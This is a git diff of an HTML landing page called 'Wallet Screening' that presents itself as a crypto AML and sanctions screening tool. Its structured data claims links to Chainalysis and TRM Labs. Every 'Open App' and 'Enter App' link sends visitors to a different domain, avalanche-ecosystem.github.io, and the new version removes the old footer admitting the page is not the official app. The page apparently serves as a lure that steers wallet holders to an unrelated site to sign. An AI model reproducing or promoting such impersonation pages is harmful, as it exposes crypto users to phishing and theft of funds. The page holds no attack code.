@@ -1,47 +1,109 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Wallet Screening - Open App</title><meta name="description" content="wallet screening for crypto address risk checks, AML context, sanctions exposure, and category-based review before transfers.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://wallet-screening.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Wallet Screening - Open App"><meta property="og:description" content="wallet screening for crypto address risk checks, AML context, sanctions exposure, and category-based review before transfers.">
-<meta property="og:url" content="https://wallet-screening.github.io/"><meta property="og:image" content="https://wallet-screening.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Wallet Screening - Open App"><meta name="twitter:description" content="wallet screening for crypto address risk checks, AML context, sanctions exposure, and category-based review before transfers."><meta name="twitter:image" content="https://wallet-screening.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://wallet-screening.github.io/#website", "url": "https://wallet-screening.github.io/", "name": "Wallet Screening"}, {"@type": "WebPage", "@id": "https://wallet-screening.github.io/#webpage", "url": "https://wallet-screening.github.io/", "name": "Wallet Screening - Open App", "description": "wallet screening for crypto address risk checks, AML context, sanctions exposure, and category-based review before transfers.", "inLanguage": "en", "isPartOf": {"@id": "https://wallet-screening.github.io/#website"}}, {"@type": "Organization", "@id": "https://wallet-screening.github.io/#org", "name": "Wallet Screening", "url": "https://wallet-screening.github.io/", "logo": "https://wallet-screening.github.io/og-cover.png", "sameAs": ["https://www.chainalysis.com/", "https://x.com/chainalysis", "https://github.com/chainalysis", "https://www.trmlabs.com/"]}, {"@type": "WebApplication", "@id": "https://wallet-screening.github.io/#app", "name": "Wallet Screening", "url": "https://wallet-screening.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "wallet screening for crypto address risk checks, AML context, sanctions exposure, and category-based review before transfers.", "featureList": ["GitHub Pages destination", "No APY claims", "Source-linked guidance"], "isPartOf": {"@id": "https://wallet-screening.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://wallet-screening.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is wallet screening in crypto?", "acceptedAnswer": {"@type": "Answer", "text": "Wallet screening is the process of checking a blockchain address for risk signals such as sanctions exposure, scam labels, hacked funds, darknet market activity, ransomware, mixer interaction, or other illicit-finance indicators. It is used by exchanges, wallets, payment companies, DeFi front ends, and compliance teams to decide whether an address should be allowed, blocked, or manually reviewed."}}, {"@type": "Question", "name": "Does wallet screening identify the owner of an address?", "acceptedAnswer": {"@type": "Answer", "text": "Usually no. Screening evaluates blockchain activity, labels, and exposure connected to an address. Some providers may associate addresses with known services or entities, but an address alone does not always prove the real-world owner. Regulated businesses combine screening with customer due diligence, account records, travel-rule processes, and manual review when needed."}}, {"@type": "Question", "name": "Can a clean wallet become risky later?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. A wallet can receive funds from a risky source after it was first screened, or new intelligence can label old activity. That is why transaction monitoring and periodic rescreening matter for active customers. A one-time pass does not guarantee that a wallet remains low risk forever, especially when funds move across DeFi, bridges, and exchanges."}}, {"@type": "Question", "name": "What does OFAC have to do with wallet screening?", "acceptedAnswer": {"@type": "Answer", "text": "OFAC administers US sanctions programs and publishes sanctions lists. Crypto compliance teams screen wallets for direct or indirect exposure to sanctioned persons, entities, and addresses where applicable. OFAC data is one input, while blockchain analytics providers add address clustering, typologies, labels, and fund-flow analysis across chains."}}, {"@type": "Question", "name": "How do wallet screening tools handle mixers?", "acceptedAnswer": {"@type": "Answer", "text": "Tools typically flag direct mixer interaction and may also evaluate indirect exposure from mixer deposits or withdrawals. The severity depends on the amount, timing, chain, distance from the mixer, and the provider's risk model. A mixer flag does not always mean the wallet owner committed wrongdoing, but it often triggers enhanced review for regulated platforms."}}, {"@type": "Question", "name": "Which chains need wallet screening?", "acceptedAnswer": {"@type": "Answer", "text": "Screening should cover the chains a business supports, not only Ethereum. Stablecoin and exchange flows often involve Tron, BNB Chain, Solana, Polygon, Arbitrum, Base, Avalanche, Bitcoin, and other networks. Cross-chain bridges can move risk between ecosystems, so multi-chain coverage and bridge-aware analytics are important for modern compliance workflows."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Wallet Screening"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Wallet Screening</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Wallet Screening</h1>
-      <div class="appcard"><div class="appcard-head"><img src="favicon.png" alt="" width="40" height="40"><b>Wallet Screening</b><span class="badge">Risk Tool</span></div><div class="appcard-chips"><span><b>Category</b> Crypto wallet risk screening</span><span><b>Network</b> Multi-chain</span><span><b>Token</b> Any screened asset</span><span><b>Custody</b> Analysis layer, not custody</span></div><a class="btn btn-dark" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Wallet Screening App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Wallet Screening ↗</a></div>
-      <p class="hero-note">Live preview — open the official Wallet Screening app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">GitHub Pages destination</span><span class="trust-chip">No APY claims</span><span class="trust-chip">Source-linked guidance</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Wallet Screening?</h2><div class="capsule"><strong>Wallet Screening</strong> is an app-first destination for reviewing crypto address risk signals before a transfer or compliance decision. The workflow is framed around <a class="inline-link" href="https://www.investopedia.com/terms/t/transaction.asp" rel="noopener noreferrer">transaction context</a>, exposure categories, and documented review, aligned with <a href="https://www.fatf-gafi.org/en/publications/Fatfrecommendations/Guidance-rba-virtual-assets-2021.html">FATF virtual asset guidance</a>.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Wallet Screening at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Crypto wallet risk screening</b></div><div class="f"><small>Network</small><b>Multi-chain</b></div><div class="f"><small>Token</small><b>Any screened asset</b></div><div class="f"><small>Custody</small><b>Analysis layer, not custody</b></div><div class="f"><small>Primary use</small><b>Sanctions, scam, <a class="inline-link" href="https://www.imf.org/en/Topics/imf-and-the-fight-against-illicit-finance" rel="noopener noreferrer">illicit-finance</a>, and counterparty risk checks</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Wallet screening for sanctions and AML risk</h2><div class="intent-a">Wallet screening checks whether a crypto address is linked to sanctions, scams, hacks, <a class="inline-link" href="https://www.britannica.com/topic/dark-web" rel="noopener noreferrer">darknet markets</a>, ransomware, terrorist financing, mixers, or other high-risk activity. Businesses use screening before accepting deposits, processing withdrawals, onboarding customers, or interacting with counterparties. The result is usually a risk score, labels, exposure analysis, and recommended review action. Screening should reference official sanctions sources such as OFAC as well as blockchain intelligence datasets. It is not the same as proving ownership of the wallet; it evaluates observable address and fund-flow risk.</div></div></section><section class="section"><div class="container"><h2>Wallet screening API for exchanges and fintech apps</h2><div class="intent-a">A wallet screening API lets an exchange, wallet, payment app, or fintech platform check addresses automatically during deposits, withdrawals, onboarding, and <a class="inline-link" href="https://www.gartner.com/en/information-technology/glossary/transaction-monitoring" rel="noopener noreferrer">transaction monitoring</a>. Common API outputs include risk category, entity labels, sanctions indicators, exposure paths, chain coverage, and recommended action. Chainalysis, TRM Labs, and Elliptic are well-known providers in this category. The integration decision should consider supported chains, latency, explainability, alert workflows, <a class="inline-link" href="https://www.g2.com/categories/compliance-management" rel="noopener noreferrer">case management</a>, false-positive handling, and how results map to the company's compliance policy.</div></div></section><section class="section section-alt"><div class="container"><h2>Wallet screening for DeFi, mixers, and bridge exposure</h2><div class="intent-a">Modern wallet screening needs more than a simple blacklist because funds often pass through <a class="inline-link" href="https://www.coingecko.com/learn/defi" rel="noopener noreferrer">DeFi protocols</a>, bridges, mixers, and <a class="inline-link" href="https://www.binance.com/en/web3-wallet/cross-chain" rel="noopener noreferrer">cross-chain routes</a>. A wallet may not be directly sanctioned but can still have exposure to hacked funds, scam proceeds, or mixer withdrawals. Good screening explains whether exposure is direct, indirect, recent, material, and on which chain it occurred. Bridge activity is especially important because risk can move from Ethereum to Tron, BNB Chain, Arbitrum, Base, or other networks before reaching a platform.</div></div></section><section class="section"><div class="container"><h2>Wallet screening <a class="inline-link" href="https://www.ibm.com/topics/false-positives" rel="noopener noreferrer">false positives</a> and manual review</h2><div class="intent-a">Wallet screening can produce false positives when labels are incomplete, addresses are shared by services, funds pass through public infrastructure, or exposure is indirect and immaterial. A mature workflow does not blindly block every flagged wallet. It classifies severity, distance from risky source, amount, time, asset, chain, and customer context. Manual review should document the evidence, escalation decision, and policy basis. Screening vendors can provide data, but the compliance program decides what action to take.</div></div></section>
-  <section class="section"><div class="container"><h2>How to explore Wallet Screening</h2><ol class="steps"><li><b>Paste the address</b><span>Enter the wallet address and confirm the chain so the review starts with the right transaction graph.</span></li><li><b>Review the context</b><span>Check whether the address is tied to deposits, withdrawals, treasury activity, counterparties, or ongoing monitoring.</span></li><li><b>Read the exposure</b><span>Prioritize category, hop distance, and sanctions relevance over a headline score.</span></li><li><b>Document the action</b><span>Save the rationale, source links, and next step for an internal audit trail.</span></li></ol><div class="cta-band"><div><p>Ready to explore?</p><p class="sub">Open the official Wallet Screening app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Wallet Screening ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>Wallet screening vs wallet audit</h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Wallet Screening</th><th>Wallet Audit</th></tr></thead><tbody><tr><td>Primary user</td><td>Compliance teams, exchanges, fintechs</td><td>Wallet owners and DeFi users</td></tr><tr><td>Main purpose</td><td>Counterparty and illicit-finance risk</td><td><a class="inline-link" href="https://www.cloudflare.com/learning/security/glossary/what-is-security-exposure/" rel="noopener noreferrer">Security exposure</a> and approvals</td></tr><tr><td>Key signals</td><td>Sanctions, labels, risk scores, fund flows</td><td>Approvals, signatures, contracts, assets</td></tr><tr><td>Typical output</td><td>Risk decision or case review</td><td>Cleanup and wallet-hardening actions</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Wallet Screening FAQ</h2><div class="faq-list"><details open><summary><h3>What is wallet screening in crypto?</h3></summary><div>Wallet screening is the process of checking a blockchain address for risk signals such as sanctions exposure, scam labels, hacked funds, darknet market activity, ransomware, mixer interaction, or other illicit-finance indicators. It is used by exchanges, wallets, payment companies, DeFi front ends, and compliance teams to decide whether an address should be allowed, blocked, or manually reviewed.</div></details><details><summary><h3>Does wallet screening identify the owner of an address?</h3></summary><div>Usually no. Screening evaluates blockchain activity, labels, and exposure connected to an address. Some providers may associate addresses with known services or entities, but an address alone does not always prove the real-world owner. Regulated businesses combine screening with customer due diligence, account records, <a class="inline-link" href="https://www.fatf-gafi.org/en/topics/travel-rule.html" rel="noopener noreferrer">travel-rule processes</a>, and manual review when needed.</div></details><details><summary><h3>Can a clean wallet become risky later?</h3></summary><div>Yes. A wallet can receive funds from a risky source after it was first screened, or new intelligence can label old activity. That is why transaction monitoring and periodic rescreening matter for active customers. A one-time pass does not guarantee that a wallet remains low risk forever, especially when funds move across DeFi, bridges, and exchanges.</div></details><details><summary><h3>What does OFAC have to do with wallet screening?</h3></summary><div>OFAC administers US sanctions programs and publishes sanctions lists. Crypto compliance teams screen wallets for direct or indirect exposure to sanctioned persons, entities, and addresses where applicable. OFAC data is one input, while blockchain analytics providers add address clustering, typologies, labels, and fund-flow analysis across chains.</div></details><details><summary><h3>How do wallet screening tools handle mixers?</h3></summary><div>Tools typically flag direct mixer interaction and may also evaluate indirect exposure from mixer deposits or withdrawals. The severity depends on the amount, timing, chain, distance from the mixer, and the provider's risk model. A mixer flag does not always mean the wallet owner committed wrongdoing, but it often triggers enhanced review for regulated platforms.</div></details><details><summary><h3>Which chains need wallet screening?</h3></summary><div>Screening should cover the chains a business supports, not only Ethereum. Stablecoin and exchange flows often involve Tron, BNB Chain, Solana, Polygon, Arbitrum, Base, Avalanche, Bitcoin, and other networks. Cross-chain bridges can move risk between ecosystems, so multi-chain coverage and bridge-aware analytics are important for modern compliance workflows.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">This page is not the official app; verify the destination domain before acting, and treat all content as educational, not financial or legal advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Wallet Screening</title>
+  <meta name="description" content="Wallet Screening checks a crypto wallet address for AML and sanctions risk before you transact.">
+  <link rel="canonical" href="https://wallet-screening.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F6F7F9">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Wallet Screening">
+  <meta property="og:description" content="Wallet Screening checks a crypto wallet address for AML and sanctions risk before you transact.">
+  <meta property="og:url" content="https://wallet-screening.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Wallet Screening">
+  <meta name="twitter:description" content="Wallet Screening checks a crypto wallet address for AML and sanctions risk before you transact.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://wallet-screening.github.io/#website",
+        "url": "https://wallet-screening.github.io/",
+        "name": "Wallet Screening",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://wallet-screening.github.io/#app",
+        "name": "Wallet Screening",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://wallet-screening.github.io/"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://wallet-screening.github.io/#organization",
+        "name": "Wallet Screening",
+        "url": "https://wallet-screening.github.io/",
+        "logo": "https://wallet-screening.github.io/favicon.png"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" aria-label="Wallet Screening home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Wallet Screening</span>
+    </a>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://www.fatf-gafi.org/en/topics/virtual-assets.html" target="_blank" rel="nofollow noopener noreferrer">FATF virtual assets</a>
+      <a href="https://ofac.treasury.gov/sanctions-list-service" target="_blank" rel="nofollow noopener noreferrer">OFAC sanctions lists</a>
+      <a href="https://www.investopedia.com/terms/m/moneylaundering.asp" target="_blank" rel="nofollow noopener noreferrer">Money laundering guide</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Wallet Screening</h1>
+      <p class="sub"><strong>Wallet Screening</strong> checks a crypto wallet address for AML and sanctions risk before you transact.</p>
+    </section>
+
+    <section class="screen-card" aria-label="Screening preview">
+      <label class="field-label" for="wallet-address">Wallet address</label>
+      <div class="wallet-field">
+        <span class="asset-chip" aria-label="Ethereum">
+          <img src="eth.png" width="22" height="22" alt="">
+          <span>ETH</span>
+        </span>
+        <input id="wallet-address" type="text" value="0x&hellip; checked in app" readonly aria-readonly="true">
+      </div>
+
+      <div class="status-row">
+        <span>Risk &mdash; checked in app</span>
+        <button class="note-toggle" type="button" aria-expanded="false" aria-controls="risk-note">Risk note</button>
+      </div>
+      <p class="risk-note" id="risk-note" hidden>Sanctions and AML context opens in the app.</p>
+
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="foot">Wallet Screening &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    var button = document.querySelector(".note-toggle");
+    var note = document.getElementById("risk-note");
+    if (!button || !note) return;
+    button.addEventListener("click", function(){
+      var open = button.getAttribute("aria-expanded") === "true";
+      button.setAttribute("aria-expanded", String(!open));
+      note.hidden = open;
+    });
+  })();
+  </script>
+</body>
+</html>
